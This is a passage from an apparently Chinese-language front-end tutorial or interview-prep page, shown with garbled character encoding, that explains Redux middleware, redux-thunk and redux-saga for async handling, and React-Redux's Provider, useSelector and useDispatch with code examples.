class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸­é—´ä»¶ç»“æ„ï¼ˆæŸ¯é‡ŒåŒ–å‡½æ•°ï¼‰</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">middleware</span> = store =&gt; <span class="hljs-function"><span class="hljs-params">next</span> =&gt;</span> <span class="hljs-function"><span class="hljs-params">action</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// å‰ç½®å¤„ç†</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;dispatching:&#x27;</span>, action);<br>  <br>  <span class="hljs-comment">// ä¼ é€’ action ç»™ä¸‹ä¸€ä¸ªä¸­é—´ä»¶æˆ– reducer</span><br>  <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">next</span>(action);<br>  <br>  <span class="hljs-comment">// åç½®å¤„ç†</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;next state:&#x27;</span>, store.<span class="hljs-title function_">getState</span>());<br>  <span class="hljs-keyword">return</span> result;<br>&#125;;<br><br><span class="hljs-comment">// ä¸­é—´ä»¶æ‰§è¡Œé¡ºåº</span><br><span class="hljs-title function_">applyMiddleware</span>(mid1, mid2, mid3)<br><span class="hljs-comment">// å®é™…è°ƒç”¨é¡ºåºï¼š</span><br><span class="hljs-comment">// mid1(store) -&gt; mid2(store) -&gt; mid3(store) -&gt; reducer</span><br></code></pre></td></tr></table></figure><h3 id="redux-thunkï¼šå¤„ç†ç®€å•å¼‚æ­¥"><a href="#redux-thunkï¼šå¤„ç†ç®€å•å¼‚æ­¥" class="headerlink" title="redux-thunkï¼šå¤„ç†ç®€å•å¼‚æ­¥"></a>redux-thunkï¼šå¤„ç†ç®€å•å¼‚æ­¥</h3><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong></p><p>å…è®¸ action åˆ›å»ºå‡½æ•°è¿”å›å‡½æ•°ï¼ˆè€Œä¸ä»…æ˜¯å¯¹è±¡ï¼‰ï¼Œè¯¥å‡½æ•°æ¥æ”¶ dispatch å’Œ getState ä½œä¸ºå‚æ•°</p><p><strong>ä½¿ç”¨ç¤ºä¾‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŒæ­¥ action</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; (&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;INCREMENT&#x27;</span> &#125;);<br><br><span class="hljs-comment">// å¼‚æ­¥ action (thunk)</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUser</span> = (<span class="hljs-params">userId</span>) =&gt; <span class="hljs-title function_">async</span> (dispatch, getState) =&gt; &#123;<br>  <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_REQUEST&#x27;</span> &#125;);<br>  <br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getUser</span>(userId);<br>    <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: user &#125;);<br>    <br>    <span class="hljs-comment">// å¯è®¿é—®å½“å‰çŠ¶æ€</span><br>    <span class="hljs-keyword">const</span> &#123; settings &#125; = <span class="hljs-title function_">getState</span>();<br>    <span class="hljs-keyword">if</span> (settings.<span class="hljs-property">notify</span>) <span class="hljs-title function_">showNotification</span>(<span class="hljs-string">&#x27;ç”¨æˆ·åŠ è½½æˆåŠŸ&#x27;</span>);<br>    <br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_FAILURE&#x27;</span>, error &#125;);<br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// ç»„ä»¶ä¸­è§¦å‘</span><br><span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">fetchUser</span>(<span class="hljs-number">123</span>));<br></code></pre></td></tr></table></figure><p><strong>é€‚ç”¨åœºæ™¯</strong></p><ul><li>API è¯·æ±‚</li><li>ç®€å•å¼‚æ­¥æ“ä½œ</li><li>éœ€è¦è®¿é—®å½“å‰çŠ¶æ€çš„å¼‚æ­¥é€»è¾‘</li></ul><p><strong>ä¼˜ç‚¹ä¸å±€é™</strong></p><table><thead><tr><th align="left">ä¼˜ç‚¹</th><th align="left">å±€é™</th></tr></thead><tbody><tr><td align="left">å­¦ä¹ æˆæœ¬ä½</td><td align="left">å¤æ‚å¼‚æ­¥æµç¨‹éš¾ç®¡ç†</td></tr><tr><td align="left">ä»£ç ç®€æ´</td><td align="left">æµ‹è¯•ç›¸å¯¹å¤æ‚</td></tr><tr><td align="left">æ— éœ€é¢å¤–åº“</td><td align="left">ä¸æ”¯æŒé«˜çº§å¼‚æ­¥æ¨¡å¼</td></tr></tbody></table><h3 id="redux-sagaï¼šå¤„ç†å¤æ‚å¼‚æ­¥"><a href="#redux-sagaï¼šå¤„ç†å¤æ‚å¼‚æ­¥" class="headerlink" title="redux-sagaï¼šå¤„ç†å¤æ‚å¼‚æ­¥"></a>redux-sagaï¼šå¤„ç†å¤æ‚å¼‚æ­¥</h3><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong></p><pre class="mermaid">graph TD  A[View] -->|dispatch| B[Action]  B --> C[Watcher Saga]  C --> D[Worker Saga]  D --> E[API Call]  E --> F[Action to Store]</pre><p><strong>å…³é”®ç‰¹æ€§</strong></p><ul><li>åŸºäº ES6 Generator å‡½æ•°</li><li>é›†ä¸­ç®¡ç†å‰¯ä½œç”¨ï¼ˆside effectsï¼‰</li><li>æä¾›ä¸°å¯Œå¼‚æ­¥æ§åˆ¶åŸè¯­ï¼ˆtakeEvery, takeLatest ç­‰ï¼‰</li><li>æ”¯æŒç«æ€æ¡ä»¶å¤„ç†ã€å¹¶è¡Œä»»åŠ¡ç­‰å¤æ‚åœºæ™¯</li></ul><p><strong>ä½¿ç”¨ç¤ºä¾‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; call, put, takeEvery &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux-saga/effects&#x27;</span>;<br><br><span class="hljs-comment">// Worker Saga</span><br><span class="hljs-keyword">function</span>* <span class="hljs-title function_">fetchUser</span>(<span class="hljs-params">action</span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">yield</span> <span class="hljs-title function_">call</span>(api.<span class="hljs-property">getUser</span>, action.<span class="hljs-property">payload</span>);<br>    <span class="hljs-keyword">yield</span> <span class="hljs-title function_">put</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: user &#125;);<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-title function_">put</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_FAILURE&#x27;</span>, error &#125;);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// Watcher Saga</span><br><span class="hljs-keyword">function</span>* <span class="hljs-title function_">watchUserRequests</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">yield</span> <span class="hljs-title function_">takeEvery</span>(<span class="hljs-string">&#x27;USER_REQUEST&#x27;</span>, fetchUser);<br>&#125;<br><br><span class="hljs-comment">// æ ¹Saga</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span>* <span class="hljs-title function_">rootSaga</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">yield</span> <span class="hljs-title function_">all</span>([<br>    <span class="hljs-title function_">watchUserRequests</span>(),<br>    <span class="hljs-comment">// å…¶ä»– watcher</span><br>  ]);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¸¸ç”¨ Effect åŸè¯­</strong></p><table><thead><tr><th align="left">Effect</th><th align="left">ä½œç”¨</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">call</td><td align="left">è°ƒç”¨å¼‚æ­¥å‡½æ•°</td><td align="left">yield call(api.fetch, url)</td></tr><tr><td align="left">put</td><td align="left">å‘èµ· action</td><td align="left">yield put({ type: â€˜SUCCESSâ€™ })</td></tr><tr><td align="left">take</td><td align="left">ç­‰å¾…æŒ‡å®š action</td><td align="left">yield take(â€˜ACTIONâ€™)</td></tr><tr><td align="left">takeEvery</td><td align="left">ç›‘å¬æ¯ä¸ª action</td><td align="left">yield takeEvery(â€˜ACTIONâ€™, saga)</td></tr><tr><td align="left">takeLatest</td><td align="left">åªå“åº”æœ€æ–°çš„ action</td><td align="left">yield takeLatest(â€˜ACTIONâ€™, saga)</td></tr><tr><td align="left">fork</td><td align="left">éé˜»å¡è°ƒç”¨ saga</td><td align="left">yield fork(otherSaga)</td></tr><tr><td align="left">all</td><td align="left">å¹¶è¡Œè¿è¡Œå¤šä¸ª Effect</td><td align="left">yield all([call(a), call(b)])</td></tr><tr><td align="left">race</td><td align="left">ç«æ€æ‰§è¡Œ</td><td align="left">yield race({ task: call(fn), cancel: take(â€˜CANCELâ€™) })</td></tr></tbody></table><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-13"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-13" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆéœ€è¦ä¸­é—´ä»¶å¤„ç†å¼‚æ­¥ï¼Ÿ</strong></p><ol><li>Redux è‡ªèº«é™åˆ¶ï¼šreducer å¿…é¡»æ˜¯çº¯å‡½æ•°ï¼Œä¸èƒ½åŒ…å«å‰¯ä½œç”¨</li><li>å¯é¢„æµ‹æ€§ï¼šé›†ä¸­ç®¡ç†å‰¯ä½œç”¨ï¼Œé¿å…åˆ†æ•£åœ¨ç»„ä»¶ä¸­</li><li>å¯ç»´æŠ¤æ€§ï¼šç»Ÿä¸€å¤„ç†é”™è¯¯ã€æ—¥å¿—ã€é‡è¯•ç­‰é€šç”¨é€»è¾‘</li><li>é«˜çº§åŠŸèƒ½ï¼šå®ç°è¯·æ±‚å–æ¶ˆã€ç«æ€å¤„ç†ç­‰å¤æ‚åœºæ™¯</li></ol><p><strong>Qï¼šå¦‚ä½•é€‰æ‹© thunk è¿˜æ˜¯ sagaï¼Ÿ</strong></p><pre class="mermaid">graph TD  A[é¡¹ç›®éœ€æ±‚] --> B{å¼‚æ­¥å¤æ‚åº¦}  B -->|ç®€å•APIè¯·æ±‚| C[redux-thunk]  B -->|å¤æ‚æµç¨‹/ç«æ€| D[redux-saga]  A --> E{å›¢é˜Ÿç†Ÿæ‚‰åº¦}  E -->|ç†Ÿæ‚‰Generator| D  E -->|æ–°æ‰‹å›¢é˜Ÿ| C  A --> F{åŒ…å¤§å°æ•æ„Ÿ}  F -->|æ˜¯| C  F -->|å¦| D</pre><h2 id="5-4-React-Reduxï¼ˆProviderã€useSelectorã€useDispatchï¼‰"><a href="#5-4-React-Reduxï¼ˆProviderã€useSelectorã€useDispatchï¼‰" class="headerlink" title="5.4 React-Reduxï¼ˆProviderã€useSelectorã€useDispatchï¼‰"></a>5.4 React-Reduxï¼ˆProviderã€useSelectorã€useDispatchï¼‰</h2><h3 id="React-Redux-æ ¸å¿ƒæ¶æ„å›¾"><a href="#React-Redux-æ ¸å¿ƒæ¶æ„å›¾" class="headerlink" title="React-Redux æ ¸å¿ƒæ¶æ„å›¾"></a>React-Redux æ ¸å¿ƒæ¶æ„å›¾</h3><pre class="mermaid">graph TD  A[Redux Store] --> B[Provider]  B -->|Context| C[React Components]  C -->|useSelector| A  C -->|useDispatch| A</pre><h3 id="Providerï¼šçŠ¶æ€æ³¨å…¥çš„åŸºçŸ³"><a href="#Providerï¼šçŠ¶æ€æ³¨å…¥çš„åŸºçŸ³" class="headerlink" title="Providerï¼šçŠ¶æ€æ³¨å…¥çš„åŸºçŸ³"></a>Providerï¼šçŠ¶æ€æ³¨å…¥çš„åŸºçŸ³</h3><p><strong>æ ¸å¿ƒä½œç”¨ä¸åŸç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Provider</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./store&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Provider</span> <span class="hljs-attr">store</span>=<span class="hljs-string">&#123;store&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">MainApp</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Provider</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ä½œç”¨ï¼šé€šè¿‡ React Context å°† Redux store æ³¨å…¥æ•´ä¸ªç»„ä»¶æ ‘</li><li>åŸç†ï¼šä½¿ç”¨ React.createContext() åˆ›å»º Store ä¸Šä¸‹æ–‡</li><li>ä½ç½®ï¼šå¿…é¡»åœ¨ç»„ä»¶æ ‘æœ€é¡¶å±‚</li></ul><p><strong>å®ç°åŸç†æ­ç§˜</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç®€åŒ–ç‰ˆ Provider å®ç°</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">StoreContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Provider</span>(<span class="hljs-params">&#123; store, children &#125;</span>) &#123;<br>  <span class="hljs-comment">// ä½¿ç”¨ useMemo é¿å…é‡å¤æ¸²æŸ“</span><br>  <span class="hljs-keyword">const</span> contextValue = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> (&#123; store &#125;), [store]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">StoreContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;contextValue&#125;</span>&gt;</span></span><br><span class="language-xml">      &#123;children&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">StoreContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="useSelectorï¼šç²¾å‡†çŠ¶æ€é€‰æ‹©"><a href="#useSelectorï¼šç²¾å‡†çŠ¶æ€é€‰æ‹©" class="headerlink" title="useSelectorï¼šç²¾å‡†çŠ¶æ€é€‰æ‹©"></a>useSelectorï¼šç²¾å‡†çŠ¶æ€é€‰æ‹©</h3><p><strong>åŸºç¡€ç”¨æ³•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useSelector &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// ä» Redux store é€‰æ‹©æ‰€éœ€çŠ¶æ€</span><br>  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">user</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;user.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–æœºåˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é»˜è®¤ä½¿ç”¨ === ä¸¥æ ¼ç›¸ç­‰æ¯”è¾ƒ</span><br><span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">user</span>);<br><br><span class="hljs-comment">// è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°</span><br><span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useSelector</span>(<br>  <span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">user</span>,<br>  <span class="hljs-function">(<span class="hljs-params">prevUser, nextUser</span>) =&gt;</span> prevUser.<span class="hljs-property">id</span> === nextUser.<span class="hljs-property">id</span><br>);<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§é€‰æ‹©å™¨æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ reselect åº“åˆ›å»ºè®°å¿†åŒ–é€‰æ‹©å™¨</span><br><span class="hljs-keyword">import</span> &#123; createSelector &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;reselect&#x27;</span>;<br><br><span class="hljs-keyword">const</span> selectActiveUsers = <span class="hljs-title function_">createSelector</span>(<br>  [<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">users</span>],<br>  <span class="hljs-function"><span class="hljs-params">users</span> =&gt;</span> users.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> user.<span class="hljs-property">isActive</span>)<br>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ActiveUsersList</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> activeUsers = <span class="hljs-title function_">useSelector</span>(selectActiveUsers);<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="useDispatchï¼šè§¦å‘çŠ¶æ€æ›´æ–°"><a href="#useDispatchï¼šè§¦å‘çŠ¶æ€æ›´æ–°" class="headerlink" title="useDispatchï¼šè§¦å‘çŠ¶æ€æ›´æ–°"></a>useDispatchï¼šè§¦å‘çŠ¶æ€æ›´æ–°</h3><p><strong>åŸºç¡€ç”¨æ³•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useDispatch &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AddTodoButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>, <span class="hljs-attr">text</span>: <span class="hljs-string">&#x27;New todo&#x27;</span> &#125;);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleClick&#125;</span>&gt;</span>æ·»åŠ <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å°è£…åŠ¨ä½œåˆ›å»ºå‡½æ•°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŠ¨ä½œåˆ›å»ºå‡½æ•°</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">addTodo</span> = (<span class="hljs-params">text</span>) =&gt; (&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>, text &#125;);<br><br><span class="hljs-comment">// ç»„ä»¶ä¸­ä½¿ç”¨</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AddTodoButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">addTodo</span>(<span class="hljs-string">&#x27;New todo&#x27;</span>)); <span class="hljs-comment">// ç›´æ¥ dispatch action</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleClick&#125;</span>&gt;</span>æ·»åŠ <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¼‚æ­¥æ“ä½œé›†æˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ redux-thunk</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUser</span> = (<span class="hljs-params">id</span>) =&gt; <span class="hljs-keyword">async</span> dispatch =&gt; &#123;<br>  <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_REQUEST&#x27;</span> &#125;);<br>  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getUser</span>(id);<br>  <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: user &#125;);<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserLoader</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">fetchUser</span>(<span class="hljs-number">123</span>));<br>  &#125;, [dispatch]);<br>  <br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¸‰å¤§-Hook-åä½œæ¨¡å¼"><a href="#ä¸‰å¤§-Hook-åä½œæ¨¡å¼" class="headerlink" title="ä¸‰å¤§ Hook åä½œæ¨¡å¼"></a>ä¸‰å¤§ Hook åä½œæ¨¡å¼</h3><p>å®Œæ•´æ•°æ®æµç¤ºä¾‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">TodoList</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 1. è·å–çŠ¶æ€</span><br>  <span class="hljs-keyword">const</span> todos = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">todos</span>);<br>  <br>  <span class="hljs-comment">// 2. è·å– dispatch å‡½æ•°</span><br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>  <br>  <span class="hljs-comment">// 3. äº‹ä»¶å¤„ç†</span><br>  <span class="hljs-keyword">const</span> handleAdd = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">addTodo</span>(<span class="hljs-string">&#x27;æ–°ä»»åŠ¡&#x27;</span>));<br>  &#125;, [dispatch]);<br>  <br>  <span class="hljs-keyword">const</span> handleToggle = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function"><span class="hljs-params">id</span> =&gt;</span> &#123;<br>    <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">toggleTodo</span>(id));<br>  &#125;, [dispatch]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleAdd&#125;</span>&gt;</span>æ·»åŠ ä»»åŠ¡<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">        &#123;todos.map(todo =&gt; (</span><br><span class="language-xml">          <span 